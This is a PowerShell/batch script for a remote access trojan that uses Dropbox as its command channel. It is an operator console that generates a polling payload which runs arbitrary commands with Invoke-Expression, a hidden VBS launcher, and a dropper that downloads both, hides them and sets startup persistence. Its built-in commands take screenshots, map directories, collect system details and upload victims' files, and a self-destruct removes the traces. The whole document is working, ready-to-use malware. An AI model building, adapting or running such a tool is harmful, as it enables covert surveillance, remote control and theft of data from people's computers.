<# :

@echo off & setlocal enabledelayedexpansion

powershell -noprofile -executionpolicy remotesigned "iex ((gc '%~f0') -join \"`n\")"
exit /b

: #>

$ProfileFile = "ATRprofiles.txt"
$CurrentProfile = $null

function Show-Help {
    Write-Host "`nAvailable Commands:" -ForegroundColor White
    Write-Host "  profile-add      - Create a new profile" -ForegroundColor White
    Write-Host "  profile-set      - Select an existing profile" -ForegroundColor White
    Write-Host "  profile-del      - Delete a profile" -ForegroundColor White
    Write-Host "  profile-list     - List all available profiles" -ForegroundColor White
    Write-Host "  profile-details  - Show details of current profile" -ForegroundColor White
    Write-Host ""
    Write-Host "  cmd              - Send a command" -ForegroundColor White
    Write-Host "  fetch            - Fetch system information" -ForegroundColor White
    Write-Host "  screenshot       - Capture a screenshot" -ForegroundColor White
    Write-Host "  tree             - Capture tree output" -ForegroundColor White
    Write-Host "  download         - Download a file" -ForegroundColor White
    Write-Host "  selfdestruct /pc - Self destruct payloads" -ForegroundColor White
    Write-Host ""
    Write-Host "  deploy           - Create the payload" -ForegroundColor White
    Write-Host "  wrap             - Create a vbs file that hides the payload" -ForegroundColor White
    Write-Host "  init             - Create the init script" -ForegroundColor White
    Write-Host "  clear            - Clear the screen" -ForegroundColor White
    Write-Host "  help             - Show this help message" -ForegroundColor White
    Write-Host "  exit             - Exit the application" -ForegroundColor White
    Write-Host ""
}

function Profile-New {
    param([string]$FilePath = $ProfileFile)

    $ProfileName  = Read-Host "`nProfile name"
    $AppKey       = Read-Host "App Key"
    $AppSecret    = Read-Host "App Secret"
    $RefreshToken = Read-Host "Refresh Token"
    Write-Host ""

    $ProfileLine = "$($ProfileName.Trim()),$($AppKey.Trim()),$($AppSecret.Trim()),$($RefreshToken.Trim())"

    if (-not (Test-Path $FilePath)) { New-Item -Path $FilePath -ItemType File -Force | Out-Null }

    Add-Content -Path $FilePath -Value $ProfileLine -Encoding UTF8

    Write-Host "Profile '$($ProfileName.Trim())' added successfully" -ForegroundColor DarkGreen
    Write-Host ""
}

function Get-Profiles {
    param([string]$FilePath = $ProfileFile)
    
    $Profiles = @()
    if (-not (Test-Path $FilePath)) { return $Profiles }

    $Lines = Get-Content $FilePath | Where-Object { $_.Trim() -ne "" }

    $index = 1
    foreach ($Line in $Lines) {
        $Line = $Line.Trim()
        $Parts = ($Line -split ",", 4)
        if ($Parts.Count -lt 4) { continue }

        $Profiles += [PSCustomObject]@{
            DisplayIndex = $index
            Name         = $Parts[0].Trim()
            AppKey       = $Parts[1].Trim()
            AppSecret    = $Parts[2].Trim()
            RefreshToken = $Parts[3].Trim()
            RawLine      = $Line
            InternalIndex = $index - 1
        }
        $index++
    }
    
    return $Profiles
}

function Profile-Set {
    param([string]$FilePath = $ProfileFile)

    $Profiles = Get-Profiles -FilePath $FilePath
    if ($Profiles.Count -eq 0) { Write-Host "No profiles exist" -ForegroundColor DarkRed; return $null }

    Write-Host "`nProfiles:" -ForegroundColor White
    foreach ($p in $Profiles) { Write-Host "  $($p.DisplayIndex): $($p.Name)" -ForegroundColor White }
    Write-Host ""

    $Selection = Read-Host "Profile index"
    Write-Host ""

    $selectedProfile = $Profiles | Where-Object { $_.DisplayIndex -eq $Selection }

    if ($selectedProfile) {
        return $selectedProfile
    } else {
        Write-Host "Invalid selection" -ForegroundColor DarkRed
        return $null
    }
    Write-Host ""
}

function Profile-Del {
    param([string]$FilePath = $ProfileFile)

    $Profiles = Get-Profiles -FilePath $FilePath
    if ($Profiles.Count -eq 0) { Write-Host "No profiles exist" -ForegroundColor DarkRed; return }

    Write-Host "`nProfiles:" -ForegroundColor White
    foreach ($p in $Profiles) { Write-Host "  $($p.DisplayIndex): $($p.Name)" }
    Write-Host ""

    $Selection = Read-Host "Profile index"
    Write-Host ""

    $profileToDelete = $Profiles | Where-Object { $_.DisplayIndex -eq $Selection }

    if ($profileToDelete) {
        $Lines = Get-Content $FilePath | Where-Object { $_.Trim() -ne "" }
        $NewLines = @()

        $found = $false
        foreach ($Line in $Lines) {
            if ($Line.Trim() -eq $profileToDelete.RawLine -and -not $found) {
                $found = $true
                continue
            }
            $NewLines += $Line
        }

        if ($NewLines.Count -eq 0) {
            Remove-Item $FilePath -Force
            Write-Host "All profiles deleted, profile file removed" -ForegroundColor DarkGreen
        } else {
            Set-Content -Path $FilePath -Value $NewLines -Encoding UTF8
            Write-Host "Profile '$($profileToDelete.Name)' deleted successfully" -ForegroundColor DarkGreen
        }

        if ($CurrentProfile -and $CurrentProfile.Name -eq $profileToDelete.Name) {
            $script:CurrentProfile = $null
            Write-Host "Current profile cleared" -ForegroundColor DarkGreen
        }
    } else {
        Write-Host "Invalid selection" -ForegroundColor DarkRed
    }
    Write-Host ""
}

function Profile-List {
    param([string]$FilePath = $ProfileFile)

    $Profiles = Get-Profiles -FilePath $FilePath
    if ($Profiles.Count -eq 0) { Write-Host "No profiles exist" -ForegroundColor DarkRed; return }

    Write-Host "`nProfiles:" -ForegroundColor White
    foreach ($p in $Profiles) {
        $currentIndicator = if ($CurrentProfile -and $CurrentProfile.Name -eq $p.Name) { " (current)" } else { "" }
        Write-Host "  $($p.DisplayIndex): $($p.Name)$currentIndicator" -ForegroundColor White
    }
    Write-Host ""
}

function Profile-Details {
    param([string]$FilePath = $ProfileFile)

    if (-not $CurrentProfile) { Write-Host "No profile selected" -ForegroundColor DarkRed; return }

    Write-Host "`nProfile Details:" -ForegroundColor White
    Write-Host "  Name:          $($CurrentProfile.Name)" -ForegroundColor White
    Write-Host "  App Key:       $($CurrentProfile.AppKey)" -ForegroundColor White
    Write-Host "  App Secret:    $($CurrentProfile.AppSecret)" -ForegroundColor White
    Write-Host "  Refresh Token: $($CurrentProfile.RefreshToken)" -ForegroundColor White
    Write-Host ""
}

function Send-Command {
    param(
        [string]$FilePath = $ProfileFile,
        [string]$CommandString
    )

    if (-not $CurrentProfile) {
        Write-Host "No profile selected" -ForegroundColor DarkRed
        return 
    }

    if (-not $CommandString) {
        $Command = Read-Host "Cmd"
        if ($Command.Trim() -eq "") {
            Write-Host "No command entered" -ForegroundColor DarkRed
            return
        }
    } else {
        $Command = $CommandString
    }

    $CmdFile = "cmd.txt"
    Set-Content -Path $CmdFile -Value $Command -Encoding UTF8

    try {
        Write-Host "Getting access token..." -ForegroundColor White

        $tokenUri = "https://api.dropbox.com/oauth2/token"
        $body = @{
            grant_type = "refresh_token"
            refresh_token = $CurrentProfile.RefreshToken
            client_id = $CurrentProfile.AppKey
            client_secret = $CurrentProfile.AppSecret
        }

        $response = Invoke-RestMethod -Uri $tokenUri -Method Post -Body $body -ContentType "application/x-www-form-urlencoded"
        $accessToken = $response.access_token

        Write-Host "Access token obtained successfully" -ForegroundColor DarkGreen

        Write-Host "Uploading file..." -ForegroundColor White

        $uploadUri = "https://content.dropboxapi.com/2/files/upload"
        $headers = @{
            "Authorization" = "Bearer $accessToken"
            "Dropbox-API-Arg" = '{"path":"/cmd.txt","mode":"overwrite","autorename":false,"mute":false}'
            "Content-Type" = "application/octet-stream"
        }

        $fileContent = Get-Content -Path $CmdFile -Raw
        $bytes = [System.Text.Encoding]::UTF8.GetBytes($fileContent)

        $uploadResponse = Invoke-RestMethod -Uri $uploadUri -Method Post -Headers $headers -Body $bytes

        Write-Host "File uploaded successfully" -ForegroundColor DarkGreen
        Write-Host "Path: $($uploadResponse.path_display)" -ForegroundColor White

        Remove-Item -Path $CmdFile -Force
        Write-Host "Local file deleted" -ForegroundColor DarkGreen

    } catch {
        Write-Host "Error: $($_.Exception.Message)" -ForegroundColor DarkRed
        if ($_.ErrorDetails.Message) {
            Write-Host "Details: $($_.ErrorDetails.Message)" -ForegroundColor DarkRed
        }
    }

    Write-Host ""
}

function Send-SelfDestruct {
    param(
        [string]$FilePath = $ProfileFile,
        [string]$TargetComputer = $null
    )
    if (-not $CurrentProfile) {
        Write-Host "No profile selected" -ForegroundColor DarkRed
        return 
    }

    try {
        Write-Host "Getting access token..." -ForegroundColor White

        $tokenUri = "https://api.dropbox.com/oauth2/token"
        $body = @{
            grant_type = "refresh_token"
            refresh_token = $CurrentProfile.RefreshToken
            client_id = $CurrentProfile.AppKey
            client_secret = $CurrentProfile.AppSecret
        }

        $response = Invoke-RestMethod -Uri $tokenUri -Method Post -Body $body -ContentType "application/x-www-form-urlencoded"
        $accessToken = $response.access_token

        Write-Host "Access token obtained successfully" -ForegroundColor DarkGreen

        Write-Host "Uploading file..." -ForegroundColor White

        $uploadUri = "https://content.dropboxapi.com/2/files/upload"
        $headers = @{
            "Authorization" = "Bearer $accessToken"
            "Dropbox-API-Arg" = '{"path":"/selfdestruct.txt","mode":"overwrite","autorename":false,"mute":false}'
            "Content-Type" = "application/octet-stream"
        }

        $fileContent = if ($TargetComputer) { "/$TargetComputer" } else { "" }
        $bytes = [System.Text.Encoding]::UTF8.GetBytes($fileContent)

        $uploadResponse = Invoke-RestMethod -Uri $uploadUri -Method Post -Headers $headers -Body $bytes

        if ($TargetComputer) {
            Write-Host "Self destruct command sent for computer: $TargetComputer" -ForegroundColor DarkGreen
        } else {
            Write-Host "Self destruct command sent for ALL computers" -ForegroundColor DarkGreen
        }
        Write-Host "File uploaded successfully" -ForegroundColor DarkGreen
        Write-Host "Path: $($uploadResponse.path_display)" -ForegroundColor White

    } catch {
        Write-Host "Error: $($_.Exception.Message)" -ForegroundColor DarkRed
        if ($_.ErrorDetails.Message) {
            Write-Host "Details: $($_.ErrorDetails.Message)" -ForegroundColor DarkRed
        }
    }

    Write-Host ""
}

function Deploy-Script {
    param([string]$FilePath = $ProfileFile)

    if (-not $CurrentProfile) {
        Write-Host "No profile selected" -ForegroundColor DarkRed
        return
    }

    Write-Host "Testing Dropbox credentials..." -ForegroundColor White
    try {
        $body = @{
            grant_type = "refresh_token"
            refresh_token = $CurrentProfile.RefreshToken
            client_id = $CurrentProfile.AppKey
            client_secret = $CurrentProfile.AppSecret
        }
        
        $response = Invoke-RestMethod -Uri "https://api.dropbox.com/oauth2/token" -Method Post -Body $body -ContentType "application/x-www-form-urlencoded"
        Write-Host "Credentials validated successfully" -ForegroundColor DarkGreen
    } catch {
        Write-Host "Error: Invalid credentials - $($_.Exception.Message)" -ForegroundColor DarkRed
        if ($_.ErrorDetails.Message) {
            Write-Host "Details: $($_.ErrorDetails.Message)" -ForegroundColor DarkRed
        }
        return
    }

    $responseTime = Read-Host "`nResponse time"

    if (-not ($responseTime -match '^\d+$')) {
        Write-Host "Invalid response time" -ForegroundColor DarkRed
        return
    }

    $pingDelay = Read-Host "Ping delay"

    if (-not ($pingDelay -match '^\d+$')) {
        Write-Host "Invalid ping delay" -ForegroundColor DarkRed
        return
    }

    Write-Host ""

    $batchContent = @"
<# :
@echo off
setlocal enabledelayedexpansion
set SCRIPT_PATH=%~f0
powershell -noprofile -executionpolicy bypass -command "iex (Get-Content -Raw '%~f0')"
exit /b
: #>

Add-Type -AssemblyName System.Web
`$clientId = "$($CurrentProfile.AppKey)"
`$clientSecret = "$($CurrentProfile.AppSecret)"
`$refreshToken = "$($CurrentProfile.RefreshToken)"
`$accessToken = `$null
`$responseTime = $responseTime
`$pingDelay = $pingDelay
`$computerName = `$env:COMPUTERNAME
`$logFileName = "log_`${computerName}.txt"
`$lastPingTime = Get-Date
`$startupTime = Get-Date -Format "yyyy-MM-dd HH:mm:ss"

function Get-AccessToken {
    `$uri = "https://api.dropbox.com/oauth2/token"
    `$body = @{
        grant_type = "refresh_token"
        refresh_token = `$refreshToken
        client_id = `$clientId
        client_secret = `$clientSecret
    }
    try {
        `$response = Invoke-RestMethod -Uri `$uri -Method Post -Body `$body -ContentType "application/x-www-form-urlencoded"
        return `$response.access_token
    }
    catch {
        Write-Host "Failed to get access token: `$(`$_.Exception.Message)" -ForegroundColor DarkRed
        return `$null
    }
}

function Check-DropboxFile {
    param(`$accessToken, `$fileName)
    `$uri = "https://api.dropboxapi.com/2/files/list_folder"
    `$headers = @{
        Authorization = "Bearer `$accessToken"
        "Content-Type" = "application/json"
    }
    `$body = @{ path = "" } | ConvertTo-Json
    try {
        `$response = Invoke-RestMethod -Uri `$uri -Method Post -Headers `$headers -Body `$body
        return (`$response.entries | Where-Object { `$_.name -eq `$fileName })
    }
    catch {
        if (`$_.Exception.Response.StatusCode -eq 401) {
            return `$null
        }
        Write-Host "Failed to check for file: `$(`$_.Exception.Message)" -ForegroundColor DarkRed
        return `$null
    }
}

function Upload-File {
    param(`$accessToken, `$localContent, `$remotePath)
    `$uri = "https://content.dropboxapi.com/2/files/upload"
    `$apiArg = @{
        path = `$remotePath
        mode = "overwrite"
        autorename = `$true
        mute = `$true
    } | ConvertTo-Json -Compress
    `$headers = @{
        Authorization = "Bearer `$accessToken"
        "Dropbox-API-Arg" = `$apiArg
        "Content-Type" = "application/octet-stream"
    }
    try {
        `$response = Invoke-RestMethod -Uri `$uri -Method Post -Headers `$headers -Body `$localContent
        return `$true
    }
    catch {
        Write-Host "Failed to upload file: `$(`$_.Exception.Message)" -ForegroundColor DarkRed
        return `$false
    }
}

function Read-FileContent {
    param(`$accessToken, `$filePath = "/cmd.txt")
    `$uri = "https://content.dropboxapi.com/2/files/download"
    `$apiArg = @{ path = `$filePath } | ConvertTo-Json -Compress
    `$headers = @{
        Authorization = "Bearer `$accessToken"
        "Dropbox-API-Arg" = `$apiArg
        "Content-Type" = "application/octet-stream"
    }
    try {
        `$response = Invoke-RestMethod -Uri `$uri -Method Post -Headers `$headers
        return `$response
    }
    catch {
        Write-Host "Failed to read file content: `$(`$_.Exception.Message)" -ForegroundColor DarkRed
        if (`$_.Exception.Response) {
            `$reader = New-Object System.IO.StreamReader(`$_.Exception.Response.GetResponseStream())
            `$reader.BaseStream.Position = 0
            `$reader.DiscardBufferedData()
            `$errorResponse = `$reader.ReadToEnd()
            Write-Host "Error details: `$errorResponse" -ForegroundColor DarkRed
        }
        return `$null
    }
}

function Delete-File {
    param(`$accessToken, `$filePath = "/cmd.txt")
    `$uri = "https://api.dropboxapi.com/2/files/delete_v2"
    `$headers = @{
        Authorization = "Bearer `$accessToken"
        "Content-Type" = "application/json"
    }
    `$body = @{ path = `$filePath } | ConvertTo-Json
    try {
        Invoke-RestMethod -Uri `$uri -Method Post -Headers `$headers -Body `$body | Out-Null
        return `$true
    }
    catch {
        Write-Host "Failed to delete file: `$(`$_.Exception.Message)" -ForegroundColor DarkRed
        return `$false
    }
}

function Append-ToLog {
    param(`$accessToken, `$message)
    `$logFile = Check-DropboxFile -accessToken `$accessToken -fileName `$logFileName
    `$newContent = `$message
    if (`$logFile) {
        `$existingContent = Read-FileContent -accessToken `$accessToken -filePath "/`$logFileName"
        if (`$existingContent) {
            `$newContent = `$existingContent + "`n" + `$message
        }
    }
    `$success = Upload-File -accessToken `$accessToken -localContent `$newContent -remotePath "/`$logFileName"
    if (-not `$success) {
        Write-Host "Failed to append to log file" -ForegroundColor DarkRed
    }
}

function Update-LastPing {
    param(`$accessToken)
    `$currentTime = Get-Date -Format "yyyy-MM-dd HH:mm:ss"
    `$newFirstLine = "# LAST PING ON `$currentTime"
    `$logFile = Check-DropboxFile -accessToken `$accessToken -fileName `$logFileName
    `$newContent = `$newFirstLine
    if (`$logFile) {
        `$existingContent = Read-FileContent -accessToken `$accessToken -filePath "/`$logFileName"
        if (`$existingContent) {
            `$contentArray = `$existingContent -split "`n"
            if (`$contentArray.Count -gt 1) {
                `$contentArray[0] = `$newFirstLine
                `$newContent = `$contentArray -join "`n"
            }
        }
    }
    `$success = Upload-File -accessToken `$accessToken -localContent `$newContent -remotePath "/`$logFileName"
    if (-not `$success) {
        Write-Host "Failed to update last ping" -ForegroundColor DarkRed
    } else {
        Write-Host "Updated last ping for `$logFileName" -ForegroundColor White
    }
}

function Process-CommandFile {
    param(`$accessToken)
    `$command = Read-FileContent -accessToken `$accessToken
    if (-not `$command) {
        Write-Host "No command found or error reading file" -ForegroundColor DarkRed
        return
    }
    try {
        Write-Host "Executing command: `$command" -ForegroundColor White
        Invoke-Expression `$command
        `$currentTime = Get-Date -Format "yyyy-MM-dd HH:mm:ss"
        `$commandLogMessage = "# EXECUTED COMMAND ON `$(`$currentTime)`n`$(`$command)"
        Append-ToLog -accessToken `$accessToken -message `$commandLogMessage
    }
    catch {
        Write-Host "Failed to execute command: `$(`$_.Exception.Message)" -ForegroundColor DarkRed
    }
    Delete-File -accessToken `$accessToken | Out-Null
}

function Check-SelfDestruct {
    param(`$accessToken)
    `$selfDestructFile = Check-DropboxFile -accessToken `$accessToken -fileName "selfdestruct.txt"
    if (`$selfDestructFile) {
        `$selfDestructContent = Read-FileContent -accessToken `$accessToken -filePath "/selfdestruct.txt"
        if (-not `$selfDestructContent) {
            `$selfDestructContent = ""
        }
        `$shouldSelfDestruct = `$false
        if (`$selfDestructContent.Trim() -eq "") {
            `$shouldSelfDestruct = `$true
            Write-Host "General self-destruct command received" -ForegroundColor DarkYellow
        } else {
            `$targetComputer = `$selfDestructContent.Trim()
            if (`$targetComputer.StartsWith("/")) {
                `$targetComputer = `$targetComputer.Substring(1)
            }
            if (`$env:COMPUTERNAME -eq `$targetComputer) {
                `$shouldSelfDestruct = `$true
                Write-Host "Targeted self-destruct command received for this computer" -ForegroundColor DarkYellow
            } else {
                Write-Host "Self-destruct command received, but targeted for: `$targetComputer" -ForegroundColor DarkYellow
            }
        }
        if (`$shouldSelfDestruct) {
            Write-Host "Initiating self-destruct sequence..." -ForegroundColor DarkYellow
            Delete-File -accessToken `$accessToken -filePath "/selfdestruct.txt" | Out-Null
            `$scriptPath = `$MyInvocation.MyCommand.Path
            if (-not `$scriptPath) {
                `$scriptPath = `$env:SCRIPT_PATH
                if (-not `$scriptPath) {
                    Write-Host "Error: Script path not found." -ForegroundColor DarkRed
                    return
                }
            }
            `$deleteCommand = 'cmd /c "timeout /t 3 /nobreak > Nul & del /f /q "' + `$scriptPath + '"'
            Start-Process -FilePath "cmd.exe" -ArgumentList "/c", `$deleteCommand -WindowStyle Hidden
            exit
        }
    }
}

while (`$true) {
    if (-not `$accessToken) {
        `$accessToken = Get-AccessToken
        if (-not `$accessToken) {
            Write-Host "Failed to obtain access token, retrying in 5 seconds..." -ForegroundColor DarkRed
            Start-Sleep 5
            continue
        }
        Update-LastPing -accessToken `$accessToken
        `$startupMessage = "# STARTUP ON `$startupTime"
        Append-ToLog -accessToken `$accessToken -message `$startupMessage
        Write-Host "Startup logged: `$startupMessage" -ForegroundColor White
    }
    try {
        Check-SelfDestruct -accessToken `$accessToken
        `$file = Check-DropboxFile -accessToken `$accessToken -fileName "cmd.txt"
        if (`$file) {
            Write-Host "Found command, processing..." -ForegroundColor DarkGreen
            Process-CommandFile -accessToken `$accessToken
        } else {
            Write-Host "Checking every `$responseTime seconds..." -ForegroundColor White
        }
        `$currentTime = Get-Date
        if ((`$currentTime - `$lastPingTime).TotalSeconds -ge `$pingDelay) {
            Update-LastPing -accessToken `$accessToken
            `$lastPingTime = `$currentTime
        }
    }
    catch {
        `$accessToken = `$null
        Write-Host "Error in main loop: `$(`$_.Exception.Message)" -ForegroundColor DarkRed
    }
    Start-Sleep `$responseTime
}

"@
    Set-Content -Path "payload.bat" -Value $batchContent -Encoding ASCII
    Write-Host "Deployment script created as 'payload.bat'" -ForegroundColor DarkGreen
    Write-Host ""
}

function Wrap-Script {
    param([string]$FilePath = $ProfileFile)

    $payloadPath = Read-Host "Payload path: APPDATA\"
    $payloadPath = $payloadPath.Trim('"')
    $escapedPath = $payloadPath -replace '"', '""'

    Write-Host ""

    $fileContent = @'
Dim shell, path
Set shell = CreateObject("WScript.Shell")
path = shell.ExpandEnvironmentStrings("%APPDATA%") & "\{0}"
shell.Run """" & path & """", 0, False
'@ -f $escapedPath

    Set-Content -Path "wrapper.vbs" -Value $fileContent -Encoding ASCII
    Write-Host "Wrap script created as 'wrapper.vbs'" -ForegroundColor DarkGreen
    Write-Host ""
}

function Init-Script {
    $payloadLink = Read-Host "Payload link"
    $wrapperLink = Read-Host "Wrapper link"

    $payloadPath = Read-Host "Payload path"
    $wrapperName = Read-Host "Wrapper name"

    $psCommand = "iwr '$payloadLink' -OutFile (Join-Path `$env:APPDATA '$payloadPath');" +
        "attrib +h (Join-Path `$env:APPDATA '$payloadPath');" +
        "iwr '$wrapperLink' -OutFile (Join-Path [Environment]::GetFolderPath('Startup') '$wrapperName');" +
        "attrib +h (Join-Path [Environment]::GetFolderPath('Startup') '$wrapperName');" +
        "& (Join-Path [Environment]::GetFolderPath('Startup') '$wrapperName')"

    $batchContent = "powershell -NoProfile -Command `"$psCommand`""

    Set-Content -Path "init.bat" -Value $batchContent -Encoding ASCII

    Write-Host "Init script created as 'init.bat'" -ForegroundColor DarkGreen
}

function Clear-Screen {
    try {
        Clear-Host
    } catch {
        Write-Host "`n" * 50
    }
}

function Cmd-Fetch {
    if (-not $CurrentProfile) {
        Write-Host "No profile selected" -ForegroundColor DarkRed
        return 
    }

    $command = @'
# CMD-FETCH
$computerName = $env:COMPUTERNAME
$username = $env:USERNAME
$ipv4Addresses = @()
$ipv4Adapters = Get-NetIPAddress -AddressFamily IPv4 | Where-Object { 
$_.IPAddress -ne '127.0.0.1' -and $_.AddressState -eq 'Preferred'
}
foreach ($adapter in $ipv4Adapters) {
$ipv4Addresses += $adapter.IPAddress
}
$ipv4 = if ($ipv4Addresses.Count -gt 0) { $ipv4Addresses -join ', ' } else { 'No IPv4 address found' }
$ipv6Addresses = @()
$ipv6Adapters = Get-NetIPAddress -AddressFamily IPv6 | Where-Object { 
$_.IPAddress -ne '::1' -and $_.AddressState -eq 'Preferred'
}
foreach ($adapter in $ipv6Adapters) {
$ipv6Addresses += $adapter.IPAddress
}
$ipv6 = if ($ipv6Addresses.Count -gt 0) { $ipv6Addresses -join ', ' } else { 'No IPv6 address found' }
$os = (Get-WmiObject -Class Win32_OperatingSystem).Caption
$memory = [math]::Round((Get-WmiObject -Class Win32_ComputerSystem).TotalPhysicalMemory / 1GB, 2)
$cpu = (Get-WmiObject -Class Win32_Processor).Name
$gpus = (Get-WmiObject -Class Win32_VideoController).Name
$gpu = if ($gpus.Count -gt 0) { $gpus -join ', ' } else { 'No GPU found' }
$output = @"
Computer Name: $computerName
Username: $username
IPv4 Addresses: $ipv4
IPv6 Addresses: $ipv6
Operating System: $os
Total Memory: $memory GB
CPU: $cpu
GPU: $gpu
"@
$bytes = [System.Text.Encoding]::UTF8.GetBytes($output)
$fileName = "fetch_$computerName.txt"
$uri = "https://content.dropboxapi.com/2/files/upload"
$apiArg = @{path = "/$fileName"; mode = "overwrite"; autorename = $true; mute = $true} | ConvertTo-Json -Compress
$headers = @{Authorization = "Bearer $accessToken"; "Dropbox-API-Arg" = $apiArg; "Content-Type" = "application/octet-stream"}
Invoke-RestMethod -Uri $uri -Method Post -Headers $headers -Body $bytes
'@

    Send-Command -CommandString $command
}

function Cmd-Screenshot {
    if (-not $CurrentProfile) {
        Write-Host "No profile selected" -ForegroundColor DarkRed
        return 
    }

    $command = @"
# CMD-SCREENSHOT
Add-Type -AssemblyName System.Windows.Forms
Add-Type -AssemblyName System.Drawing
`$screen = [System.Windows.Forms.SystemInformation]::VirtualScreen
`$bitmap = New-Object System.Drawing.Bitmap `$screen.Width, `$screen.Height
`$graphics = [System.Drawing.Graphics]::FromImage(`$bitmap)
`$graphics.CopyFromScreen(`$screen.X, `$screen.Y, 0, 0, `$bitmap.Size)
`$graphics.Dispose()
`$memoryStream = New-Object System.IO.MemoryStream
`$bitmap.Save(`$memoryStream, [System.Drawing.Imaging.ImageFormat]::Png)
`$screenshotBytes = `$memoryStream.ToArray()
`$memoryStream.Dispose()
`$bitmap.Dispose()
`$computerName = `$env:COMPUTERNAME
`$timeStamp = Get-Date -Format 'yyyyMMdd_HHmmss'
`$fileName = "screenshot_`${computerName}_`${timeStamp}.png"
`$uri = "https://content.dropboxapi.com/2/files/upload"
`$apiArg = @{path = "/`$fileName"; mode = "overwrite"; autorename = `$true; mute = `$true} | ConvertTo-Json -Compress
`$headers = @{Authorization = "Bearer `$accessToken"; "Dropbox-API-Arg" = `$apiArg; "Content-Type" = "application/octet-stream"}
Invoke-RestMethod -Uri `$uri -Method Post -Headers `$headers -Body `$screenshotBytes
"@

    Send-Command -CommandString $command
}

function Cmd-Tree {
    if (-not $CurrentProfile) {
        Write-Host "No profile selected" -ForegroundColor DarkRed
        return 
    }

    Write-Host " 1. C:" -ForegroundColor White
    Write-Host " 2. User" -ForegroundColor White
    Write-Host " 3. Custom" -ForegroundColor White
    Write-Host ""

    $choice = Read-Host "Scan"
    Write-Host ""

    $path = ""
    switch ($choice) {
        "1" { $path = "C:\" }
        "2" { $path = "`$env:USERPROFILE" }
        default {
            $customPath = Read-Host "Path"
            $path = "$customPath" 
        }
    }

    $command = @"
# CMD-TREE
function Get-TreeStructure {
param(`$Path, `$IndentLevel = 0)
`$output = @()
`$items = Get-ChildItem -Path `$Path | Sort-Object Name
foreach (`$item in `$items) {
`$indent = "  " * `$IndentLevel
if (`$item.PSIsContainer) {
`$output += "`$indent[`$(`$item.Name)]/"
`$output += Get-TreeStructure -Path `$item.FullName -IndentLevel (`$IndentLevel + 1)
} else {
`$output += "`$indent`$(`$item.Name) (`$(`$item.Length) bytes)"
}
}
return `$output
}
`$treeOutput = @("Tree for: $path", "")
`$treeOutput += Get-TreeStructure -Path "$path"
`$treeText = `$treeOutput -join "`r`n"
`$computerName = `$env:COMPUTERNAME
`$timeStamp = Get-Date -Format 'yyyyMMdd_HHmmss'
`$fileName = "tree_`${computerName}_`${timeStamp}.txt"
`$uri = "https://content.dropboxapi.com/2/files/upload"
`$apiArg = @{path = "/`$fileName"; mode = "overwrite"; autorename = `$true; mute = `$true} | ConvertTo-Json -Compress
`$headers = @{Authorization = "Bearer `$accessToken"; "Dropbox-API-Arg" = `$apiArg; "Content-Type" = "application/octet-stream"}
`$bytes = [System.Text.Encoding]::UTF8.GetBytes(`$treeText)
Invoke-RestMethod -Uri `$uri -Method Post -Headers `$headers -Body `$bytes
"@

    Send-Command -CommandString $command
}

function Cmd-Download {
    if (-not $CurrentProfile) {
        Write-Host "No profile selected" -ForegroundColor DarkRed
        return 
    }

    Write-Host " 1. User" -ForegroundColor White
    Write-Host " 2. AppData (Roaming)" -ForegroundColor White
    Write-Host " 3. AppData (Local)" -ForegroundColor White
    Write-Host " 4. Custom" -ForegroundColor White
    Write-Host ""

    $choice = Read-Host "Starting path"
    Write-Host ""

    $filePath = ""

    switch ($choice) {
        "1" {
            $fileName = Read-Host "USERPROFILE\"
            $filePath = "`$env:USERPROFILE\$fileName"
        }
        "2" {
            $fileName = Read-Host "APPDATA\"
            $filePath = "`$env:APPDATA\$fileName"
        }
        "3" {
            $fileName = Read-Host "LOCALAPPDATA\"
            $filePath = "`$env:LOCALAPPDATA\$fileName"
        }
        default {
            $filePath = Read-Host "Path"
        }
    }
    $filePath = $filePath -replace '"', ''

    $downloadCommand = @"
# CMD-DOWNLOAD
`$filePath = "$filePath"
if (Test-Path `$filePath) {
`$originalName = [System.IO.Path]::GetFileName(`$filePath)
`$fileName = "`$originalName"
`$fileContent = [System.IO.File]::ReadAllBytes(`$filePath)
`$uri = "https://content.dropboxapi.com/2/files/upload"
`$apiArg = @{path = "/`$fileName"; mode = "overwrite"; autorename = `$true; mute = `$true} | ConvertTo-Json -Compress
`$headers = @{Authorization = "Bearer `$accessToken"; "Dropbox-API-Arg" = `$apiArg; "Content-Type" = "application/octet-stream"}
Invoke-RestMethod -Uri `$uri -Method Post -Headers `$headers -Body `$fileContent
"File uploaded successfully: `$fileName"
} else {
"File not found: `$filePath"
}
"@

    Send-Command -CommandString $downloadCommand
}

$exitRequested = $false

Write-Host '    e Y8b  88P''888''Y88 888 88e ' -ForegroundColor DarkBlue
Write-Host '   d8b Y8b P''  888  ''Y 888 888D' -ForegroundColor DarkBlue
Write-Host '  d888b Y8b    888     888 88"   ' -ForegroundColor DarkBlue
Write-Host ' 6E65787371b   888     888 b,    ' -ForegroundColor DarkBlue
Write-Host 'd8888888b Y8b  888     888 88b,  ' -ForegroundColor DarkBlue
Write-Host ""

while (-not $exitRequested) {
    if ($CurrentProfile) {
        Write-Host -NoNewline "#$($CurrentProfile.Name) > " -ForegroundColor DarkBlue
    }
    else {
        Write-Host -NoNewline "# > " -ForegroundColor DarkBlue
    }

    $InputLine = Read-Host
    $InputParts = $InputLine.Split(" ", 2)
    $Command = $InputParts[0].ToLower()
    $Args = if ($InputParts.Count -gt 1) { $InputParts[1] } else { "" }

    switch -regex ($Command) {
        "^(profile-add|p-add|profile-new|p-new)$" {
            Profile-New 
        }
        "^(profile-set|p-set|p-s|p)$" {
            $Selected = Profile-Set
            if ($Selected) {
                $CurrentProfile = $Selected
                Write-Host "Profile set to: $($CurrentProfile.Name)" -ForegroundColor DarkGreen
            }
        }
        "^(profile-del|p-del|profile-remove|p-remove|p-rem)$" {
            Profile-Del
        }
        "^(profile-list|p-list|p-l)$" {
            Profile-List
        }
        "^(profile-details|p-details|p-d)$" {
            Profile-Details
        }
        "^(cmd|c)$" {
            Send-Command
        }
        "^(fetch|info)$" {
            Cmd-Fetch
        }
        "^(screenshot|ss)$" {
            Cmd-Screenshot
        }
        "^(tree)$" {
            Cmd-Tree
        }
        "^(download|dwn|get)$" {
            Cmd-Download
        }
        "^selfdestruct$" {
            $targetComputer = $null
            if ($Args) {
                $targetComputer = $Args -replace '^/+', ''
            }
            Send-SelfDestruct -TargetComputer $targetComputer
        }
        "^(deploy|d|payload)$" {
            Deploy-Script
        }
        "^wrap$" {
            Wrap-Script
        }
        "^(init|i)$" {
            Init-Script
        }
        "^(cls|clear)$" {
            Clear-Screen
        }
        "^(help|h)$" {
            Show-Help
        }
        "^exit$" { 
            $exitRequested = $true
        }
